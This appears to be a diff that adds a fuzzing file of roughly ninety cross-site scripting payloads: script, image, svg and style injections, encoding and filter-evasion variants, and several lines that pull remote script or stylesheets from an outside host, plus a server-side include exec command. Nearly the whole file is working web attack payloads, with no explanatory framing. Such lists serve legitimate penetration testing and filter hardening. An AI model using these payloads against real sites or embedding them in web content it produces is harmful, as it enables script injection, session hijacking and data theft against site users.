@@ -1,0 +1,91 @@
+PL"><svg/onload=alert("XSS")><"
+"-prompt(8)-"
+'-prompt(8)-'
+";a=prompt,a()//
+';a=prompt,a()//
+'-eval("window['pro'%2B'mpt'](8)")-'
+"-eval("window['pro'%2B'mpt'](8)")-"
+'`"><\x3Cscript>javascript:alert(1)</script>        
+'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
+<script>javascript:alert(1)</script\x0D
+<script>javascript:alert(1)</script\x0A
+<script>javascript:alert(1)</script\x0B
+<script charset="\x22>javascript:alert(1)</script>
+<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
+`"'><img src='#\x27 onerror=javascript:alert(1)>
+%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
+<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
+<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
+<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
+'`"><\x3Cscript>javascript:alert(1)</script>
+'`"><\x00script>javascript:alert(1)</script>
+"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
+"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
+<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
+<script src="data:\xD4\x8F,javascript:alert(1)"></script>
+<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
+<script src="data:\xCB\x8F,javascript:alert(1)"></script>
+<b <script>alert(1)</script>0
+<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
+<embed src="javascript:alert(1)">
+<img src="javascript:alert(1)">
+<image src="javascript:alert(1)">
+<script src="javascript:alert(1)">
+<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
+<? foo="><script>javascript:alert(1)</script>">
+<! foo="><script>javascript:alert(1)</script>">
+</ foo="><script>javascript:alert(1)</script>">
+<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
+<% foo><x foo="%><script>javascript:alert(1)</script>">
+<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
+<img \x00src=x onerror="alert(1)">
+<script>+-+-1-+-+alert(1)</script>
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<script itworksinallbrowsers>/*<script* */alert(1)</script
+<img src ?itworksonchrome?\/onerror = alert(1)
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg><script onlypossibleinopera:-)> alert(1)
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<script x> alert(1) </script 1=2
+<div/onmouseover='alert(1)'> style="x:">
+<--`<img/src=` onerror=alert(1)> --!>
+<svg><script ?>alert(1)
+<div style="binding: url([link to code]);">
+<div style="width: expression(document.vulnerable=true;);">
+<style type="text/javascript">document.vulnerable=true;</style>
+<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
+<style><!--</style><script>document.vulnerable=true;//--></script>
+<<script>document.vulnerable=true;</script>
+<![<!--]]<script>document.vulnerable=true;//--></script>
+<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
+<img src="blah"onmouseover="document.vulnerable=true;">
+<img src="blah>" onmouseover="document.vulnerable=true;">
+<xml src="javascript:document.vulnerable=true;">
+<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
+<div datafld="b" dataformatas="html" datasrc="#X"></div>
+[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
+<style>@import'http://www.securitycompass.com/xss.css';</style>
+<meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet">
+<style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
+<script SRC="http://www.securitycompass.com/xss.jpg"></script>
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
+<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
+<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
+<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
+<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
+<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
+<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
+<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script>
+<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
+&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;/br style=a:expression(alert())&gt;
+'"><svg/onload=alert(document.domain)>
